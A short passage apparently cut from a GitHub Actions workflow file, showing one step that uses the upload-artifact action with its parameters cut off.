 
       - uses: actions/upload-artifact@v4
         with:
